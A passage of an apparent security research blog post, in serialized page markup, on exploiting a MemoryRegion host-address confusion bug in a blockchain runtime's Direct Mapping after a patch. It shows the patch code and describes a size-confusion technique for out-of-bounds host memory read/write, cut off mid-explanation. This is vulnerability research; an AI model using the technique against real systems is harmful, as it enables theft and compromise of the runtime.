react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[37]}],[\"$\",\"span\",\"code-segement310\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement311\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement312\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[38]}],[\"$\",\"span\",\"code-segement314\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement315\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement316\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[39]}],[\"$\",\"span\",\"code-segement318\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement319\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement320\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" realloc_region \"]}],[\"$\",\"span\",\"code-segement321\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement322\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement323\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"account_realloc_region\"]}],[\"$\",\"span\",\"code-segement324\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement325\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[40]}],[\"$\",\"span\",\"code-segement327\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        memory_mapping\"]}],[\"$\",\"span\",\"code-segement328\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement329\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[41]}],[\"$\",\"span\",\"code-segement331\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement332\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement333\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_data_addr\"]}],[\"$\",\"span\",\"code-segement334\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement335\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[42]}],[\"$\",\"span\",\"code-segement337\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement338\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement339\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"original_data_len\"]}],[\"$\",\"span\",\"code-segement340\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement341\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[43]}],[\"$\",\"span\",\"code-segement343\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        is_loader_deprecated\"]}],[\"$\",\"span\",\"code-segement344\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement345\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--44\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[44]}],[\"$\",\"span\",\"code-segement347\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement348\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement349\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}],[\"$\",\"span\",\"code-segement350\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement351\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--45\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[45]}],[\"$\",\"span\",\"code-segement353\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement354\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement355\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement356\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement357\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement358\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}],[\"$\",\"span\",\"code-segement359\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement360\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement361\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement362\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement363\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement364\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" realloc_region \"]}],[\"$\",\"span\",\"code-segement365\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement366\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--46\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[46]}],\"        region\\n\",[\"$\",\"span\",\"line-number--47\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[47]}],[\"$\",\"span\",\"code-segement370\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement371\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement372\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"state\\n\"]}],[\"$\",\"span\",\"line-number--48\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[48]}],[\"$\",\"span\",\"code-segement374\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement375\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement376\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}],[\"$\",\"span\",\"code-segement377\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement378\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement379\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_account\"]}],[\"$\",\"span\",\"code-segement380\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement381\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"can_data_be_changed\"]}],[\"$\",\"span\",\"code-segement382\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement383\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement384\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement385\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"is_ok\"]}],[\"$\",\"span\",\"code-segement386\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement387\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement388\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement389\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement390\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--49\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[49]}],[\"$\",\"span\",\"code-segement392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement393\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement394\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement395\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Writable\"]}],[\"$\",\"span\",\"code-segement396\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--50\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[50]}],[\"$\",\"span\",\"code-segement398\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement399\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement400\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement401\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"else\"]}],[\"$\",\"span\",\"code-segement402\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement403\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement404\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--51\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[51]}],[\"$\",\"span\",\"code-segement406\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement407\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryState\"]}],[\"$\",\"span\",\"code-segement408\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement409\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Readable\"]}],[\"$\",\"span\",\"code-segement410\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--52\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[52]}],[\"$\",\"span\",\"code-segement412\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement413\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement414\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement415\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--53\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[53]}],[\"$\",\"span\",\"code-segement418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement419\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement420\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--54\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[54]}],\"\\n\",[\"$\",\"span\",\"line-number--55\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[55]}],[\"$\",\"span\",\"code-segement424\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement425\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement426\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement427\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement428\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement429\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement430\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--56\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[56]}],[\"$\",\"span\",\"code-segement432\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement433\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-105\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The idea of the patch is that when a CPI happens, changes to the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"owner\"}],\" of an account may be updated and flushed to \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"TransactionContext\"}],\". One example of this is when creating a new token account. The caller is expected to transfer ownership of an empty account to the token program, and the token program will then initialize the token account with relevant data. Obviously we should no longer allow the caller program to directly write the token account data after the token program has taken ownership of it. With Direct Mapping enabled, this means \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" state must be updated accordingly.\"]}],\"\\n\",[\"$\",\"p\",\"p-106\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"At first glance, the patch seemed unrelated to our finding. But unfortunately, updating \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"state\"}],\" means that while we may point the host pointer of an originally writable \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" to some unwritable account data, after CPI finishes, the \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" will just end up being marked as readonly. This kills our exploit.\"]}],\"\\n\",[\"$\",\"p\",\"p-107\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Still, \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"the vulnerability itself hadn't been patched\"}],\". We just need to bypass the new checks, and that is exactly what we, Anatomist Security, are best at. With years of deep security research and CTF experience, we specialize in turning dead ends into breakthroughs.\"]}],\"\\n\",[\"$\",\"h2\",\"h2-8\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"New Exploitation Strategy\"}],\"\\n\",[\"$\",\"p\",\"p-108\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"So back to the drawing board, what else can we do with our bug? The essence of the bug is confusion of \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion.host_addr\"}],\". In other words, we could overwrite an arbitrary \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\"'s \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" with another \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\"'s \",[\"$\",\"code\",\"code-4\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-109\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"While our first attempt was to change the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" of a writable \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" to some readonly account data buffer, it is definitely not the only way to wield the bug. Our second idea is, instead of trying to write to a readonly account data buffer, what if we changed the \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" of a writable \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" to the backing buffer of another writable \",[\"$\",\"code\",\"code-4\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" that has a different length?\"]}],\"\\n\",[\"$\",\"h3\",\"h3-19\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"The New Attack Vector: Size Confusion\"}],\"\\n\",[\"$\",\"p\",\"p-110\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"This new idea led us to a completely different exploitation approach. Instead of trying to bypass permission checks, we could exploit size differences between different account buffers for out-of-bound read/write, a primitive commonly used in binary exploitation.\"}],\"\\n\",[\"$\",\"p\",\"p-111\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Consider two accounts, both writable by the attacker:\"}],\"\\n\",[\"$\",\"ul\",\"ul-1\",{\"className\":\"text-xl py-2 text-pretty sm:text-justify\",\"style\":{\"display\":\"block\",\"listStyleType\":\"disc\",\"paddingInlineStart\":\"40px\"},\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"SWAP\"}],\": A small-sized buffer account with data length 0x100\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"LEVERAGE\"}],\": A bigger-sized buffer account, with data length 0x400, whose \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" will be replaced to SWAP's \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}]]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-112\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"If we could make \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"LEVERAGE\"}],\" account's \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" point to \",[\"$\",\"strong\",\"strong-1\",{\"children\":\"SWAP\"}],\" account's buffer, by accessing \",[\"$\",\"strong\",\"strong-2\",{\"children\":\"LEVERAGE\"}],\" account's virtual memory, we ends up touching \",[\"$\",\"strong\",\"strong-3\",{\"children\":\"SWAP\"}],\" account's data buffer on the host. Since the \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" of \",[\"$\",\"strong\",\"strong-4\",{\"children\":\"LEVERAGE\"}],\" has a size of 0x400, larger than the size of the underlying host buffer of \",[\"$\",\"strong\",\"strong-5\",{\"children\":\"SWAP\"}],\", once we go past the first 0x100 bytes of \",[\"$\",\"strong\",\"strong-6\",{\"children\":\"LEVERAGE\"}],\"'s virtual memory, it will map beyond the end of the \",[\"$\",\"strong\",\"strong-7\",{\"children\":\"SWAP\"}],\" data buffer. This gives us out-of-bounds read/write primitive on host memory.\"]}],\"\\n\",[\"$\",\"h3\",\"h3-20\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"From Limited OOB to Arbitrary read/write\"}],\"\\n\",[\"$\",\"p\",\"p-113\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"With this, we gain out-of-bounds read/write access to 0x300 bytes (0x400 - 0x100) after \",[\"$\",\"strong\",\"strong-0\",{\"children\":\"SWAP\"}],\"'s data buffer in host memory. However, this primitive is limited to a specific range. We need to make it more powerful.\"]}],\"\\n\",[\"$\",\"p\",\"p-114\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The idea is straightforward: since \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', 